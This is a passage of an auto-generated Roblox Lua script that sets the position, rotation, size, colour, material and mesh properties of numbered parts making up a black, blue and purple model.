SpecialMesh180.Scale = Vector3.new(0.550000012, 1.04999995, 0.899999976)
SpecialMesh180.MeshType = Enum.MeshType.Brick
Part181.Parent = Model0
Part181.CFrame = CFrame.new(-0.61356318, 3.48533392, -13.9631662, 0.999985635, 0.0047621401, -0.00246015727, 0.00513686566, -0.720367908, 0.693573296, 0.00153067405, -0.693575978, -0.720381975)
Part181.Orientation = Vector3.new(-43.9099998, -179.800003, 179.589996)
Part181.Position = Vector3.new(-0.61356318, 3.48533392, -13.9631662)
Part181.Rotation = Vector3.new(-136.089996, -0.140000001, -0.269999981)
Part181.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part181.Velocity = Vector3.new(1.96594527e-08, 0.00246695359, 2.58346063e-07)
Part181.Size = Vector3.new(0.275000006, 0.413124949, 0.622375011)
Part181.Anchored = true
Part181.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part181.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part181.BrickColor = BrickColor.new("Really black")
Part181.CanCollide = false
Part181.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part181.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part181.Material = Enum.Material.Metal
Part181.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part181.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part181.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part181.brickColor = BrickColor.new("Really black")
SpecialMesh182.Parent = Part181
SpecialMesh182.Scale = Vector3.new(0.400000006, 1.04999995, 0.5)
SpecialMesh182.MeshType = Enum.MeshType.Brick
Part183.Parent = Model0
Part183.CFrame = CFrame.new(-0.610578179, 2.93933439, -14.0816517, 0.999985635, 0.00162795174, -0.00510674529, 0.005136678, -0.0189458355, 0.999807417, 0.00153088616, -0.999819279, -0.0189539269)
Part183.Orientation = Vector3.new(-88.8799973, -164.919998, 164.830002)
Part183.Position = Vector3.new(-0.610578179, 2.93933439, -14.0816517)
Part183.Rotation = Vector3.new(-91.0899963, -0.289999992, -0.0899999961)
Part183.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part183.Velocity = Vector3.new(1.06236229e-07, 0.00246670726, 1.39605754e-06)
Part183.Size = Vector3.new(0.275000006, 0.252000004, 0.213375002)
Part183.Anchored = true
Part183.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part183.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part183.BrickColor = BrickColor.new("Really black")
Part183.CanCollide = false
Part183.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part183.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part183.Material = Enum.Material.Metal
Part183.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part183.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part183.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part183.brickColor = BrickColor.new("Really black")
SpecialMesh184.Parent = Part183
SpecialMesh184.Scale = Vector3.new(0.569999993, 0.125, 0.375)
SpecialMesh184.MeshType = Enum.MeshType.Wedge
Part185.Parent = Model0
Part185.CFrame = CFrame.new(-0.61852932, 3.41544771, -10.4871407, 0.999985635, -0.00162795314, 0.00510659395, 0.00513652712, 0.0189461038, -0.999807417, 0.00153088907, 0.999819279, 0.0189541951)
Part185.Orientation = Vector3.new(88.8799973, 15.0799999, 15.1700001)
Part185.Position = Vector3.new(-0.61852932, 3.41544771, -10.4871407)
Part185.Rotation = Vector3.new(88.909996, 0.289999992, 0.0899999961)
Part185.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part185.Velocity = Vector3.new(3.07410488e-08, 0.00247419602, 4.03969523e-07)
Part185.Size = Vector3.new(0.270000011, 0.21875, 0.234375)
Part185.Anchored = true
Part185.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part185.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part185.BrickColor = BrickColor.new("Really black")
Part185.CanCollide = false
Part185.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part185.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part185.Material = Enum.Material.Metal
Part185.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part185.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part185.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part185.brickColor = BrickColor.new("Really black")
SpecialMesh186.Parent = Part185
SpecialMesh186.Scale = Vector3.new(0.5, 0.5, 0.5)
SpecialMesh186.MeshType = Enum.MeshType.Wedge
Part187.Parent = Model0
Part187.CFrame = CFrame.new(-0.608188927, 3.09825993, -16.1759663, -0.999985635, 0.00519088237, -0.00133629935, -0.0051367199, -0.999273539, -0.0377651006, -0.0015313623, -0.0377576947, 0.999285877)
Part187.Orientation = Vector3.new(2.15999985, -0.0799999982, -179.709991)
Part187.Position = Vector3.new(-0.608188927, 3.09825993, -16.1759663)
Part187.Rotation = Vector3.new(2.15999985, -0.0799999982, -179.699997)
Part187.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part187.Velocity = Vector3.new(8.10360774e-08, 0.00246234378, 1.06490097e-06)
Part187.Size = Vector3.new(0.275000006, 0.235124931, 1.6693753)
Part187.Anchored = true
Part187.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part187.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part187.BrickColor = BrickColor.new("Really black")
Part187.CanCollide = false
Part187.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part187.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part187.Material = Enum.Material.Metal
Part187.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part187.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part187.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part187.brickColor = BrickColor.new("Really black")
SpecialMesh188.Parent = Part187
SpecialMesh188.Scale = Vector3.new(0.400000006, 1.04999995, 1)
SpecialMesh188.MeshType = Enum.MeshType.Brick
Part189.Parent = Model0
Part189.CFrame = CFrame.new(-0.611664593, 3.3476572, -14.7413998, 0.999985635, -0.00162807363, 0.00510707032, 0.00513700629, 0.018946372, -0.999807417, 0.0015309992, 0.999819279, 0.0189544633)
Part189.Orientation = Vector3.new(88.8799973, 15.0799999, 15.1700001)
Part189.Position = Vector3.new(-0.611664593, 3.3476572, -14.7413998)
Part189.Rotation = Vector3.new(88.909996, 0.289999992, 0.0899999961)
Part189.Color = Color3.new(0.0509804, 0.411765, 0.67451)
Part189.Velocity = Vector3.new(4.14902424e-08, 0.00246533239, 5.45226158e-07)
Part189.Size = Vector3.new(0.275000006, 0.480124891, 0.214375019)
Part189.Anchored = true
Part189.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part189.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part189.BrickColor = BrickColor.new("Bright blue")
Part189.CanCollide = false
Part189.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part189.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part189.Material = Enum.Material.Neon
Part189.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part189.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part189.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part189.brickColor = BrickColor.new("Bright blue")
SpecialMesh190.Parent = Part189
SpecialMesh190.Scale = Vector3.new(0.449999988, 1, 0.100000001)
SpecialMesh190.MeshType = Enum.MeshType.Brick
Part191.Parent = Model0
Part191.CFrame = CFrame.new(-0.637731671, 3.71308732, -19.354105, -0.0050775772, -0.999985635, -0.00171704381, 0.999324501, -0.00513670873, 0.0363931209, -0.0364014208, -0.00153109431, 0.999336243)
Part191.Orientation = Vector3.new(-2.08999991, -0.099999994, 90.2900009)
Part191.Position = Vector3.new(-0.637731671, 3.71308732, -19.354105)
Part191.Rotation = Vector3.new(-2.08999991, -0.099999994, 90.2900009)
Part191.Color = Color3.new(0.384314, 0.145098, 0.819608)
Part191.Velocity = Vector3.new(-1.64544822e-08, 0.00245571672, -2.16228841e-07)
Part191.Size = Vector3.new(0.210000038, 0.200000003, 0.285374999)
Part191.Anchored = true
Part191.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part191.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part191.BrickColor = BrickColor.new("Royal purple")
Part191.CanCollide = false
Part191.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part191.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part191.Material = Enum.Material.Neon
Part191.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part191.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part191.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part191.brickColor = BrickColor.new("Royal purple")
SpecialMesh192.Parent = Part191
SpecialMesh192.Scale = Vector3.new(0.5, 0.300000012, 0.5)
SpecialMesh192.MeshType = Enum.MeshType.Wedge
Part193.Parent = Model0
Part193.CFrame = CFrame.new(-0.613232374, 3.39655375, -13.8819904, 0.999985635, 0.000250508543, -0.00535421353, 0.00513686566, 0.240468621, 0.97064352, 0.00153067405, -0.970657051, 0.240463868)
Part193.Orientation = Vector3.new(-76.0800018, -1.27999997, 1.22000003)
Part193.Position = Vector3.new(-0.613232374, 3.39655375, -13.8819904)
Part193.Rotation = Vector3.new(-76.0899963, -0.310000002, -0.00999999978)
Part193.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part193.Velocity = Vector3.new(3.37369386e-08, 0.00246712286, 4.43339275e-07)
Part193.Size = Vector3.new(0.275000006, 0.422124922, 0.412375003)
Part193.Anchored = true
Part193.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part193.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part193.BrickColor = BrickColor.new("Really black")
Part193.CanCollide = false
Part193.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part193.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part193.Material = Enum.Material.Metal
Part193.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part193.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part193.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part193.brickColor = BrickColor.new("Really black")
SpecialMesh194.Parent = Part193
SpecialMesh194.Scale = Vector3.new(0.5, 1.04999995, 0.5)
SpecialMesh194.MeshType = Enum.MeshType.Brick
Part195.Parent = Model0
Part195.CFrame = CFrame.new(-0.640585661, 2.53611565, -13.5419912, 0.00476224814, -0.999985635, -0.00245993445, -0.72036773, -0.00513678836, 0.693573475, -0.693576157, -0.00153091096, -0.720381796)
Part195.Orientation = Vector3.new(-43.9099998, -179.800003, -90.409996)
Part195.Position = Vector3.new(-0.640585661, 2.53611565, -13.5419912)
Part195.Rotation = Vector3.new(-136.089996, -0.140000001, 89.7299957)
Part195.Color = Color3.new(0.384314, 0.145098, 0.819608)
Part195.Velocity = Vector3.new(1.70172896e-07, 0.00246782694, 2.23625375e-06)
Part195.Size = Vector3.new(0.421999991, 0.200000003, 0.280375004)
Part195.Anchored = true
Part195.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part195.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part195.BrickColor = BrickColor.new("Royal purple")
Part195.CanCollide = false
Part195.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part195.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part195.Material = Enum.Material.Neon
Part195.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part195.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part195.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part195.brickColor = BrickColor.new("Royal purple")
SpecialMesh196.Parent = Part195
SpecialMesh196.Scale = Vector3.new(1, 0.300000012, 0.5)
SpecialMesh196.MeshType = Enum.MeshType.Wedge
Part197.Parent = Model0
Part197.CFrame = CFrame.new(-0.647041559, 3.82817221, -13.658843, -0.00162801228, -0.999985635, 0.00510653481, 0.0189460143, -0.00513646938, -0.999807417, 0.999819279, -0.00153094972, 0.0189541057)
Part197.Orientation = Vector3.new(88.8799973, 15.0799999, 105.169998)
Part197.Position = Vector3.new(-0.647041559, 3.82817221, -13.658843)
Part197.Rotation = Vector3.new(88.909996, 0.289999992, 90.0899963)
Part197.Color = Color3.new(0.384314, 0.145098, 0.819608)
Part197.Velocity = Vector3.new(-3.47029321e-08, 0.00246758247, -4.56033831e-07)
Part197.Size = Vector3.new(0.643000007, 0.200000003, 0.280375004)
Part197.Anchored = true
Part197.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part197.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part197.BrickColor = BrickColor.new("Royal purple")
Part197.CanCollide = false
Part197.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part197.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part197.Material = Enum.Material.Neon
Part197.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part197.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part197.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part197.brickColor = BrickColor.new("Royal purple")
SpecialMesh198.Parent = Part197
SpecialMesh198.Scale = Vector3.new(1, 0.300000012, 0.5)
SpecialMesh198.MeshType = Enum.MeshType.Wedge
Part199.Parent = Model0
Part199.CFrame = CFrame.new(-0.615469754, 3.2510047, -11.9310894, -0.999985635, -0.00162807154, -0.00510656228, -0.00513649778, 0.0189459547, 0.999807417, -0.00153100886, 0.999819279, -0.0189540461)
Part199.Orientation = Vector3.new(-88.8799973, -164.919998, -15.1700001)
Part199.Position = Vector3.new(-0.615469754, 3.2510047, -11.9310894)
Part199.Rotation = Vector3.new(-91.0899963, -0.289999992, 179.909988)
Part199.Color = Color3.new(0.0509804, 0.411765, 0.67451)
Part199.Velocity = Vector3.new(5.68160452e-08, 0.00247118762, 7.46623186e-07)
Part199.Size = Vector3.new(0.275000006, 0.261124998, 0.245374992)
Part199.Anchored = true
Part199.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part199.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part199.BrickColor = BrickColor.new("Bright blue")
Part199.CanCollide = false
Part199.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part199.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part199.Material = Enum.Material.Neon
Part199.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part199.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part199.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part199.brickColor = BrickColor.new("Bright blue")
SpecialMesh200.Parent = Part199
SpecialMesh200.Scale = Vector3.new(0.375, 1.04999995, 0.5)
SpecialMesh200.MeshType = Enum.MeshType.Brick
Part201.Parent = Model0
Part201.CFrame = CFrame.new(-0.615578175, 3.21754885, -11.7504148, -0.999985635, 0.00162786292, 0.00510683237, -0.00513676414, -0.0189459566, -0.999807417, -0.00153079513, -0.999819279, 0.0189540461)
Part201.Orientation = Vector3.new(88.8799973, 15.0799999, -164.830002)
Part201.Position = Vector3.new(-0.615578175, 3.21754885, -11.7504148)
Part201.Rotation = Vector3.new(88.909996, 0.289999992, -179.909988)
Part201.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part201.Velocity = Vector3.new(6.21209963e-08, 0.0024715641, 8.16335842e-07)
Part201.Size = Vector3.new(0.275000006, 0.214125022, 0.234375)
Part201.Anchored = true
Part201.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part201.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part201.BrickColor = BrickColor.new("Really black")
Part201.CanCollide = false
Part201.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part201.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part201.Material = Enum.Material.Metal
Part201.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part201.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part201.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part201.brickColor = BrickColor.new("Really black")
SpecialMesh202.Parent = Part201
SpecialMesh202.Scale = Vector3.new(0.5, 0.560000002, 0.400000006)
SpecialMesh202.MeshType = Enum.MeshType.Wedge
Part203.Parent = Model0
Part203.CFrame = CFrame.new(-0.613475382, 3.25657153, -13.2536583, -0.999985635, 0.00162801275, 0.00510680024, -0.00513673527, -0.0189461038, -0.999807417, -0.00153094472, -0.999819279, 0.0189541951)
Part203.Orientation = Vector3.new(88.8799973, 15.0799999, -164.830002)
Part203.Position = Vector3.new(-0.613475382, 3.25657153, -13.2536583)
Part203.Rotation = Vector3.new(88.909996, 0.289999992, -179.909988)
Part203.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part203.Velocity = Vector3.new(5.59333202e-08, 0.00246843207, 7.35023434e-07)
Part203.Size = Vector3.new(0.275000006, 0.204125047, 0.210375011)
Part203.Anchored = true
Part203.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part203.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part203.BrickColor = BrickColor.new("Really black")
Part203.CanCollide = false
Part203.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part203.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part203.Material = Enum.Material.Metal
Part203.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part203.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part203.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part203.brickColor = BrickColor.new("Really black")
SpecialMesh204.Parent = Part203
SpecialMesh204.Scale = Vector3.new(0.5, 0.5, 0.5)
SpecialMesh204.MeshType = Enum.MeshType.Wedge
Part205.Parent = Model0
Part205.CFrame = CFrame.new(-0.605959892, 3.52715993, -19.0706863, -0.999985635, 0.00510674436, -0.0016279578, -0.00513667939, -0.999807417, 0.0189470276, -0.00153088616, 0.018955119, 0.999819279)
Part205.Orientation = Vector3.new(-1.09000003, -0.0899999961, -179.709991)
Part205.Position = Vector3.new(-0.605959892, 3.52715993, -19.0706863)
Part205.Rotation = Vector3.new(-1.09000003, -0.0899999961, -179.709991)
Part205.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part205.Velocity = Vector3.new(1.30272237e-08, 0.0024563123, 1.71192255e-07)
Part205.Size = Vector3.new(0.275000006, 0.446125001, 0.496375084)
Part205.Anchored = true
Part205.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part205.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part205.BrickColor = BrickColor.new("Really black")
Part205.CanCollide = false
Part205.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part205.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part205.Material = Enum.Material.Metal
Part205.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part205.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part205.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part205.brickColor = BrickColor.new("Really black")
SpecialMesh206.Parent = Part205
SpecialMesh206.Scale = Vector3.new(0.400000006, 1, 0.899999976)
SpecialMesh206.MeshType = Enum.MeshType.Wedge
Part207.Parent = Model0
Part207.CFrame = CFrame.new(-0.617458701, 3.24875402, -10.62463, -0.999985635, -0.00162816094, -0.00510671316, -0.00513665052, 0.0189459547, 0.999807417, -0.00153109536, 0.999819279, -0.0189540461)
Part207.Orientation = Vector3.new(-88.8799973, -164.919998, -15.1700001)
Part207.Position = Vector3.new(-0.617458701, 3.24875402, -10.62463)
Part207.Rotation = Vector3.new(-91.0899963, -0.289999992, 179.909988)
Part207.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part207.Velocity = Vector3.new(5.71729402e-08, 0.00247390964, 7.51312939e-07)
Part207.Size = Vector3.new(0.25999999, 0.375, 0.21875)
Part207.Anchored = true
Part207.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part207.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part207.BrickColor = BrickColor.new("Really black")
Part207.CanCollide = false
Part207.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part207.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part207.Material = Enum.Material.Metal
Part207.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part207.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part207.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part207.brickColor = BrickColor.new("Really black")
SpecialMesh208.Parent = Part207
SpecialMesh208.Scale = Vector3.new(0.300000012, 1, 1)
SpecialMesh208.MeshType = Enum.MeshType.Wedge
Part209.Parent = Model0
Part209.CFrame = CFrame.new(-0.614153862, 3.21053505, -12.6548157, -0.999985635, -0.00162816129, -0.00510668149, -0.00513661886, 0.0189460143, 0.999807417, -0.00153109606, 0.999819279, -0.0189541057)
Part209.Orientation = Vector3.new(-88.8799973, -164.919998, -15.1700001)
Part209.Position = Vector3.new(-0.614153862, 3.21053505, -12.6548157)
Part209.Rotation = Vector3.new(-91.0899963, -0.289999992, 179.909988)
Part209.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part209.Velocity = Vector3.new(6.32331378e-08, 0.00246967981, 8.30950682e-07)
Part209.Size = Vector3.new(0.275000006, 0.35512504, 0.416375011)
Part209.Anchored = true
Part209.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part209.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part209.BrickColor = BrickColor.new("Really black")
Part209.CanCollide = false
Part209.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part209.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part209.Material = Enum.Material.Metal
Part209.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part209.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part209.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part209.brickColor = BrickColor.new("Really black")
SpecialMesh210.Parent = Part209
SpecialMesh210.Scale = Vector3.new(0.5, 0.560000002, 0.5)
SpecialMesh210.MeshType = Enum.MeshType.Wedge
Part211.Parent = Model0
Part211.CFrame = CFrame.new(-0.640777826, 2.97037435, -14.8715458, 0.00156102644, -0.999985635, -0.00512771169, -0.00585717242, -0.00513677299, 0.99996984, -0.999981701, -0.00153094484, -0.00586510729)
Part211.Orientation = Vector3.new(-89.5599976, -138.839996, -131.25)
Part211.Position = Vector3.new(-0.640777826, 2.97037435, -14.8715458)
Part211.Rotation = Vector3.new(-90.3399963, -0.289999992, 89.909996)
Part211.Color = Color3.new(0.384314, 0.145098, 0.819608)
Part211.Velocity = Vector3.new(1.01314356e-07, 0.00246505649, 1.33137894e-06)
Part211.Size = Vector3.new(0.49000001, 0.200000003, 0.290374994)
Part211.Anchored = true
Part211.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part211.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part211.BrickColor = BrickColor.new("Royal purple")
Part211.CanCollide = false
Part211.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part211.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part211.Material = Enum.Material.Neon
Part211.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part211.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part211.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part211.brickColor = BrickColor.new("Royal purple")
SpecialMesh212.Parent = Part211
SpecialMesh212.Scale = Vector3.new(1, 0.300000012, 0.5)
SpecialMesh212.MeshType = Enum.MeshType.Wedge
Part213.Parent = Model0
Part213.CFrame = CFrame.new(-0.609622896, 3.39657903, -16.2390652, 0.999985635, -0.00133592181, 0.00519115385, 0.00513700396, -0.0377659053, -0.999273479, 0.00153099932, 0.999285877, -0.0377584994)
Part213.Orientation = Vector3.new(87.8199997, 172.169998, 172.25)
Part213.Position = Vector3.new(-0.609622896, 3.39657903, -16.2390652)
Part213.Rotation = Vector3.new(92.159996, 0.299999982, 0.0799999982)
Part213.Color = Color3.new(0.0509804, 0.411765, 0.67451)
Part213.Velocity = Vector3.new(3.37329027e-08, 0.002462212, 4.43286638e-07)
Part213.Size = Vector3.new(0.275000006, 0.533124864, 0.214375019)
Part213.Anchored = true
Part213.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part213.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part213.BrickColor = BrickColor.new("Bright blue")
Part213.CanCollide = false
Part213.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part213.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part213.Material = Enum.Material.Neon
Part213.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part213.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part213.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part213.brickColor = BrickColor.new("Bright blue")
SpecialMesh214.Parent = Part213
SpecialMesh214.Scale = Vector3.new(0.449999988, 0.899999976, 0.100000001)
SpecialMesh214.MeshType = Enum.MeshType.Brick
Part215.Parent = Model0
Part215.CFrame = CFrame.new(-0.612417579, 3.49721146, -14.7513313, 0.999985635, -0.00219574547, 0.00488994364, 0.00513701141, 0.13200599, -0.991235793, 0.00153099908, 0.991246581, 0.132015377)
Part215.Orientation = Vector3.new(82.409996, 2.11999989, 2.23000002)
Part215.Position = Vector3.new(-0.612417579, 3.49721146, -14.7513313)
Part215.Rotation = Vector3.new(82.409996, 0.280000001, 0.129999995)
Part215.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part215.Velocity = Vector3.new(1.77760739e-08, 0.00246531144, 2.33596552e-07)
Part215.Size = Vector3.new(0.275000006, 0.488124937, 0.359375)
Part215.Anchored = true
Part215.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part215.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part215.BrickColor = BrickColor.new("Really black")
Part215.CanCollide = false
Part215.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part215.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part215.Material = Enum.Material.Metal
Part215.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part215.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part215.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part215.brickColor = BrickColor.new("Really black")
SpecialMesh216.Parent = Part215
SpecialMesh216.Scale = Vector3.new(0.400000006, 1, 0.5)
SpecialMesh216.MeshType = Enum.MeshType.Brick
Part217.Parent = Model0
Part217.CFrame = CFrame.new(-0.645515323, 3.66365719, -14.1031828, -0.0047622188, -0.999985635, 0.00246008043, 0.720367849, -0.00513686892, -0.693573356, 0.693576038, -0.00153078465, 0.720381975)
Part217.Orientation = Vector3.new(43.9099998, 0.199999988, 90.409996)
Part217.Position = Vector3.new(-0.645515323, 3.66365719, -14.1031828)
Part217.Rotation = Vector3.new(43.9099998, 0.140000001, 90.2699966)
Part217.Color = Color3.new(0.384314, 0.145098, 0.819608)
Part217.Velocity = Vector3.new(-8.61649951e-09, 0.00246665697, -1.13230158e-07)
Part217.Size = Vector3.new(0.496000022, 0.200000003, 0.280375004)
Part217.Anchored = true
Part217.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part217.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part217.BrickColor = BrickColor.new("Royal purple")
Part217.CanCollide = false
Part217.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part217.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part217.Material = Enum.Material.Neon
Part217.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part217.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part217.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part217.brickColor = BrickColor.new("Royal purple")
SpecialMesh218.Parent = Part217
SpecialMesh218.Scale = Vector3.new(1, 0.300000012, 0.5)
SpecialMesh218.MeshType = Enum.MeshType.Wedge
Part219.Parent = Model0
Part219.CFrame = CFrame.new(-0.611597419, 2.92886329, -13.380847, -0.999985635, -0.00162816129, -0.00510668149, -0.00513661886, 0.0189460143, 0.999807417, -0.00153109606, 0.999819279, -0.0189541057)
Part219.Orientation = Vector3.new(-88.8799973, -164.919998, -15.1700001)
Part219.Position = Vector3.new(-0.611597419, 2.92886329, -13.380847)
Part219.Rotation = Vector3.new(-91.0899963, -0.289999992, 179.909988)
Part219.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part219.Velocity = Vector3.new(1.07896597e-07, 0.00246816734, 1.41787655e-06)
Part219.Size = Vector3.new(0.275000006, 0.630125046, 0.280375004)
Part219.Anchored = true
Part219.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part219.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part219.BrickColor = BrickColor.new("Really black")
Part219.CanCollide = false
Part219.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part219.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part219.Material = Enum.Material.Metal
Part219.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part219.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
